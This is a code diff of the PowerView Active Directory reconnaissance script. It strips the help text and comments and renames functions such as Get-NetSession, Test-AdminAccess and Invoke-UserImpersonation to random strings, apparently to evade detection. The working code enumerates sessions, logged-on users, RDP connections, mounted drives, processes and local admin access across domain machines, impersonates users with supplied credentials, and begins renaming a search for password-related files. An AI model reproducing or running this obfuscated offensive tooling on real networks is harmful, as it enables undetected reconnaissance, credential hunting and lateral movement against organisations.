-Get-NetSession -ComputerName sqlserver
-
-Returns active sessions on the 'sqlserver' host.
-
-.EXAMPLE
-
-Get-DomainController | Get-NetSession
-
-Returns active sessions on all domain controllers.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-NetSession -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.SessionInfo
-
-A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
-the CName/UserName/Time/IdleTime for each session, with the ComputerName added.
-
-.LINK
-
-http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
 
     [OutputType('PowerView.SessionInfo')]
     [CmdletBinding()]
@@ -15012,38 +9084,38 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # arguments for NetSessionEnum
+            
             $QueryLevel = 10
             $PtrInfo = [IntPtr]::Zero
             $EntriesRead = 0
             $TotalRead = 0
             $ResumeHandle = 0
 
-            # get session information
+            
             $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
 
-            # locate the offset of the initial intPtr
+            
             $Offset = $PtrInfo.ToInt64()
 
-            # 0 = success
+            
             if (($Result -eq 0) -and ($Offset -gt 0)) {
 
-                # work out how much to increment the pointer by finding out the size of the structure
+                
                 $Increment = $SESSION_INFO_10::GetSize()
 
-                # parse all the result structures
+                
                 for ($i = 0; ($i -lt $EntriesRead); $i++) {
-                    # create a new int ptr at the given offset and cast the pointer as our result structure
+                    
                     $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                     $Info = $NewIntPtr -as $SESSION_INFO_10
 
-                    # return all the sections of the structure - have to do it this way for V2
+                    
                     $Session = $Info | Select-Object *
                     $Session | Add-Member Noteproperty 'ComputerName' $Computer
                     $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
@@ -15052,11 +9124,11 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
                     $Session
                 }
 
-                # free up the result buffer
+                
                 $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                Write-Verbose "[3F2205T7] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
@@ -15064,75 +9136,14 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-RegLoggedOn {
-<#
-.SYNOPSIS
+function VY8M1WWI {
 
-Returns who is logged onto the local (or a remote) machine
-through enumeration of remote registry keys.
-
-Note: This function requires only domain user rights on the
-machine you're enumerating, but remote registry must be enabled.
-
-Author: Matt Kelly (@BreakersAll)  
-License: BSD 3-Clause  
-Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  
-
-.DESCRIPTION
-
-This function will query the HKU registry values to retrieve the local
-logged on users SID and then attempt and reverse it.
-Adapted technique from Sysinternal's PSLoggedOn script. Benefit over
-using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
-required (NetWkstaUserEnum requires remote admin access).
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for remote registry values (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-RegLoggedOn
-
-Returns users actively logged onto the local host.
-
-.EXAMPLE
-
-Get-RegLoggedOn -ComputerName sqlserver
-
-Returns users actively logged onto the 'sqlserver' host.
-
-.EXAMPLE
-
-Get-DomainController | Get-RegLoggedOn
-
-Returns users actively logged on all domain controllers.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-RegLoggedOn -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.RegLoggedOnUser
-
-A PSCustomObject including the UserDomain/UserName/UserSID of each
-actively logged on user, with the ComputerName added.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.RegLoggedOnUser')]
@@ -15147,17 +9158,17 @@ actively logged on user, with the ComputerName added.
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
             try {
-                # retrieve HKU remote registry values
+                
                 $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")
 
-                # sort out bogus sid's like _class
+                
                 $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                     $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'
 
@@ -15179,83 +9190,21 @@ actively logged on user, with the ComputerName added.
                 }
             }
             catch {
-                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
+                Write-Verbose "[VY8M1WWI] Error opening remote registry on '$ComputerName' : $_"
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetRDPSession {
-<#
-.SYNOPSIS
+function YB8TOZ4Z {
 
-Returns remote desktop/session information for the local (or a remote) machine.
-
-Note: only members of the Administrators or Account Operators local group
-can successfully execute this functionality on a remote target.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
-Win32API calls to query a given RDP remote service for active sessions and originating
-IPs. This is a replacement for qwinsta.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for active sessions (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-NetRDPSession
-
-Returns active RDP/terminal sessions on the local host.
-
-.EXAMPLE
-
-Get-NetRDPSession -ComputerName "sqlserver"
-
-Returns active RDP/terminal sessions on the 'sqlserver' host.
-
-.EXAMPLE
-
-Get-DomainController | Get-NetRDPSession
-
-Returns active RDP/terminal sessions on all domain controllers.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-NetRDPSession -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.RDPSessionInfo
-
-A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
-with the ComputerName added.
-
-.LINK
-
-https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
-#>
 
     [OutputType('PowerView.RDPSessionInfo')]
     [CmdletBinding()]
@@ -15273,38 +9222,38 @@ https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
 
-            # open up a handle to the Remote Desktop Session host
+            
             $Handle = $Wtsapi32::WTSOpenServerEx($Computer)
 
-            # if we get a non-zero handle back, everything was successful
+            
             if ($Handle -ne 0) {
 
-                # arguments for WTSEnumerateSessionsEx
+                
                 $ppSessionInfo = [IntPtr]::Zero
                 $pCount = 0
 
-                # get information on all current sessions
+                
                 $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
-                # locate the offset of the initial intPtr
+                
                 $Offset = $ppSessionInfo.ToInt64()
 
                 if (($Result -ne 0) -and ($Offset -gt 0)) {
 
-                    # work out how much to increment the pointer by finding out the size of the structure
+                    
                     $Increment = $WTS_SESSION_INFO_1::GetSize()
 
-                    # parse all the result structures
+                    
                     for ($i = 0; ($i -lt $pCount); $i++) {
 
-                        # create a new int ptr at the given offset and cast the pointer as our result structure
+                        
                         $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                         $Info = $NewIntPtr -as $WTS_SESSION_INFO_1
 
@@ -15314,14 +9263,14 @@ https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                             $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                         }
                         else {
-                            # if no hostname returned, use the specified hostname
+                            
                             $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                         }
 
                         $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName
 
                         if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
-                            # if a domain isn't returned just use the username
+                            
                             $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                         }
                         else {
@@ -15334,12 +9283,12 @@ https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                         $ppBuffer = [IntPtr]::Zero
                         $pBytesReturned = 0
 
-                        # query for the source client IP with WTSQuerySessionInformation
-                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
+                        
+                        
                         $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                         if ($Result2 -eq 0) {
-                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
+                            Write-Verbose "[YB8TOZ4Z] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                         }
                         else {
                             $Offset2 = $ppBuffer.ToInt64()
@@ -15358,96 +9307,37 @@ https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                             $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                             $RDPSession
 
-                            # free up the memory buffer
+                            
                             $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)
 
                             $Offset += $Increment
                         }
                     }
-                    # free up the memory result buffer
+                    
                     $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                 }
                 else {
-                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                    Write-Verbose "[YB8TOZ4Z] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                 }
-                # close off the service handle
+                
                 $Null = $Wtsapi32::WTSCloseServer($Handle)
             }
             else {
-                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
+                Write-Verbose "[YB8TOZ4Z] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
             }
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Test-AdminAccess {
-<#
-.SYNOPSIS
+function F32E8AKI {
 
-Tests if the current user has administrative access to the local (or a remote) machine.
-
-Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
-    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'  
-    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'  
-    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'  
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will use the OpenSCManagerW Win32API call to establish
-a handle to the remote host. If this succeeds, the current user context
-has local administrator acess to the target.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to check for local admin access (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Test-AdminAccess -ComputerName sqlserver
-
-Returns results indicating whether the current user has admin access to the 'sqlserver' host.
-
-.EXAMPLE
-
-Get-DomainComputer | Test-AdminAccess
-
-Returns what machines in the domain the current user has access to.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Test-AdminAccess -ComputerName sqlserver -Credential $Cred
-
-.OUTPUTS
-
-PowerView.AdminAccess
-
-A PSCustomObject containing the ComputerName and 'IsAdmin' set to whether
-the current user has local admin rights, along with the ComputerName added.
-
-.LINK
-
-https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
-http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
-#>
 
     [OutputType('PowerView.AdminAccess')]
     [CmdletBinding()]
@@ -15465,26 +9355,26 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # 0xF003F - SC_MANAGER_ALL_ACCESS
-            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
+            
+            
             $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
             $IsAdmin = New-Object PSObject
             $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer
 
-            # if we get a non-zero handle back, everything was successful
+            
             if ($Handle -ne 0) {
                 $Null = $Advapi32::CloseServiceHandle($Handle)
                 $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
             }
             else {
-                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+                Write-Verbose "[F32E8AKI] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                 $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
             }
             $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
@@ -15494,61 +9384,14 @@ http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-w
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Get-NetComputerSiteName {
-<#
-.SYNOPSIS
+function QNE3IO5Q {
 
-Returns the AD site where the local (or a remote) machine resides.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will use the DsGetSiteName Win32API call to look up the
-name of the site where a specified computer resides.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to check the site for (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system using Invoke-UserImpersonation.
-
-.EXAMPLE
-
-Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local
-
-Returns the site for WINDOWS1.testlab.local.
-
-.EXAMPLE
-
-Get-DomainComputer | Get-NetComputerSiteName
-
-Returns the sites for every machine in AD.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred
-
-.OUTPUTS
-
-PowerView.ComputerSite
-
-A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
-#>
 
     [OutputType('PowerView.ComputerSite')]
     [CmdletBinding()]
@@ -15566,13 +9409,13 @@ A PSCustomObject containing the ComputerName, IPAddress, and associated Site nam
 
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            $LogonToken = ECK2AE5S -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # if we get an IP address, try to resolve the IP to a hostname
+            
             if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                 $IPAddress = $Computer
                 $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
@@ -15594,12 +9437,12 @@ A PSCustomObject containing the ComputerName, IPAddress, and associated Site nam
                 $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
             }
             else {
-                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
+                Write-Verbose "[QNE3IO5Q] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                 $ComputerSite | Add-Member Noteproperty 'SiteName' ''
             }
             $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
 
-            # free up the result buffer
+            
             $Null = $Netapi32::NetApiBufferFree($PtrInfo)
 
             $ComputerSite
@@ -15608,67 +9451,14 @@ A PSCustomObject containing the ComputerName, IPAddress, and associated Site nam
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
 function Get-WMIRegProxy {
-<#
-.SYNOPSIS
 
-Enumerates the proxy server and WPAD conents for the current user.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Enumerates the proxy server and WPAD specification for the current user
-on the local machine (default), or a machine specified with -ComputerName.
-It does this by enumerating settings from
-HKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings.
-
-.PARAMETER ComputerName
-
-Specifies the system to enumerate proxy settings on. Defaults to the local host.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connecting to the remote system.
-
-.EXAMPLE
-
-Get-WMIRegProxy
-
-ComputerName           ProxyServer            AutoConfigURL         Wpad
-------------           -----------            -------------         ----
-WINDOWS1               http://primary.test...
-
-.EXAMPLE
-
-$Cred = Get-Credential "TESTLAB\administrator"
-Get-WMIRegProxy -Credential $Cred -ComputerName primary.testlab.local
-
-ComputerName            ProxyServer            AutoConfigURL         Wpad
-------------            -----------            -------------         ----
-windows1.testlab.local  primary.testlab.local
-
-.INPUTS
-
-String
-
-Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).
-
-.OUTPUTS
-
-PowerView.ProxySettings
-
-Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
-#>
 
     [OutputType('PowerView.ProxySettings')]
     [CmdletBinding()]
@@ -15699,7 +9489,7 @@ Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and 
                 $RegProvider = Get-WmiObject @WmiArguments
                 $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
 
-                # HKEY_CURRENT_USER
+                
                 $HKCU = 2147483649
                 $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                 $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
@@ -15736,62 +9526,7 @@ Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and 
 
 
 function Get-WMIRegLastLoggedOn {
-<#
-.SYNOPSIS
 
-Returns the last user who logged onto the local (or a remote) machine.
-
-Note: This function requires administrative rights on the machine you're enumerating.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-This function uses remote registry to enumerate the LastLoggedOnUser registry key
-for the local (or remote) machine.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for remote registry values (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connecting to the remote system.
-
-.EXAMPLE
-
-Get-WMIRegLastLoggedOn
-
-Returns the last user logged onto the local machine.
-
-.EXAMPLE
-
-Get-WMIRegLastLoggedOn -ComputerName WINDOWS1
-
-Returns the last user logged onto WINDOWS1
-
-.EXAMPLE
-
-Get-DomainComputer | Get-WMIRegLastLoggedOn
-
-Returns the last user logged onto all machines in the domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred
-
-.OUTPUTS
-
-PowerView.LastLoggedOnUser
-
-A PSCustomObject containing the ComputerName and last loggedon user.
-#>
 
     [OutputType('PowerView.LastLoggedOnUser')]
     [CmdletBinding()]
@@ -15809,7 +9544,7 @@ A PSCustomObject containing the ComputerName and last loggedon user.
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # HKEY_LOCAL_MACHINE
+            
             $HKLM = 2147483650
 
             $WmiArguments = @{
@@ -15821,7 +9556,7 @@ A PSCustomObject containing the ComputerName and last loggedon user.
             }
             if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
 
-            # try to open up the remote registry key to grab the last logged on user
+            
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
@@ -15844,63 +9579,7 @@ A PSCustomObject containing the ComputerName and last loggedon user.
 
 
 function Get-WMIRegCachedRDPConnection {
-<#
-.SYNOPSIS
 
-Returns information about RDP connections outgoing from the local (or remote) machine.
-
-Note: This function requires administrative rights on the machine you're enumerating.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: ConvertFrom-SID  
-
-.DESCRIPTION
-
-Uses remote registry functionality to query all entries for the
-"Windows Remote Desktop Connection Client" on a machine, separated by
-user and target server.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connecting to the remote system.
-
-.EXAMPLE
-
-Get-WMIRegCachedRDPConnection
-
-Returns the RDP connection client information for the local machine.
-
-.EXAMPLE
-
-Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local
-
-Returns the RDP connection client information for the WINDOWS2.testlab.local machine
-
-.EXAMPLE
-
-Get-DomainComputer | Get-WMIRegCachedRDPConnection
-
-Returns cached RDP information for all machines in the domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred
-
-.OUTPUTS
-
-PowerView.CachedRDPConnection
-
-A PSCustomObject containing the ComputerName and cached RDP information.
-#>
 
     [OutputType('PowerView.CachedRDPConnection')]
     [CmdletBinding()]
@@ -15918,7 +9597,7 @@ A PSCustomObject containing the ComputerName and cached RDP information.
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # HKEY_USERS
+            
             $HKU = 2147483651
 
             $WmiArguments = @{
@@ -15933,7 +9612,7 @@ A PSCustomObject containing the ComputerName and cached RDP information.
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
-                # extract out the SIDs of domain users in this hive
+                
                 $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
 
                 ForEach ($UserSID in $UserSIDs) {
@@ -15945,11 +9624,11 @@ A PSCustomObject containing the ComputerName and cached RDP information.
                             $UserName = ConvertFrom-SID -ObjectSid $UserSID
                         }
 
-                        # pull out all the cached RDP connections
+                        
                         $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames
 
                         ForEach ($Connection in $ConnectionKeys) {
-                            # make sure this key is a cached connection
+                            
                             if ($Connection -match 'MRU.*') {
                                 $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
 
@@ -15964,7 +9643,7 @@ A PSCustomObject containing the ComputerName and cached RDP information.
                             }
                         }
 
-                        # pull out all the cached server info with username hints
+                        
                         $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames
 
                         ForEach ($Server in $ServerKeys) {
@@ -15995,61 +9674,7 @@ A PSCustomObject containing the ComputerName and cached RDP information.
 
 
 function Get-WMIRegMountedDrive {
-<#
-.SYNOPSIS
 
-Returns information about saved network mounted drives for the local (or remote) machine.
-
-Note: This function requires administrative rights on the machine you're enumerating.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: ConvertFrom-SID  
-
-.DESCRIPTION
-
-Uses remote registry functionality to enumerate recently mounted network drives.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for mounted drive information (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connecting to the remote system.
-
-.EXAMPLE
-
-Get-WMIRegMountedDrive
-
-Returns the saved network mounted drives for the local machine.
-
-.EXAMPLE
-
-Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local
-
-Returns the saved network mounted drives for the WINDOWS2.testlab.local machine
-
-.EXAMPLE
-
-Get-DomainComputer | Get-WMIRegMountedDrive
-
-Returns the saved network mounted drives for all machines in the domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred
-
-.OUTPUTS
-
-PowerView.RegMountedDrive
-
-A PSCustomObject containing the ComputerName and mounted drive information.
-#>
 
     [OutputType('PowerView.RegMountedDrive')]
     [CmdletBinding()]
@@ -16067,7 +9692,7 @@ A PSCustomObject containing the ComputerName and mounted drive information.
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
-            # HKEY_USERS
+            
             $HKU = 2147483651
 
             $WmiArguments = @{
@@ -16082,7 +9707,7 @@ A PSCustomObject containing the ComputerName and mounted drive information.
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
-                # extract out the SIDs of domain users in this hive
+                
                 $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
 
                 ForEach ($UserSID in $UserSIDs) {
@@ -16130,46 +9755,7 @@ A PSCustomObject containing the ComputerName and mounted drive information.
 
 
 function Get-WMIProcess {
-<#
-.SYNOPSIS
 
-Returns a list of processes and their owners on the local or remote machine.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
-including the owners of the particular process.
-
-.PARAMETER ComputerName
-
-Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
-Defaults to 'localhost'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote system.
-
-.EXAMPLE
-
-Get-WMIProcess -ComputerName WINDOWS1
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential $Cred
-
-.OUTPUTS
-
-PowerView.UserProcess
-
-A PSCustomObject containing the remote process information.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.UserProcess')]
@@ -16214,94 +9800,8 @@ A PSCustomObject containing the remote process information.
 }
 
 
-function Find-InterestingFile {
-<#
-.SYNOPSIS
+function 9AZ4NGYT {
 
-Searches for files on the given path that match a series of specified criteria.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  
-
-.DESCRIPTION
-
-This function recursively searches a given UNC path for files with
-specific keywords in the name (default of pass, sensitive, secret, admin,
-login and unattend*.xml). By default, hidden files/folders are included
-in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
-is used to temporarily map the remote share.
-
-.PARAMETER Path
-
-UNC/local path to recursively search.
-
-.PARAMETER Include
-
-Only return files/folders that match the specified array of strings,
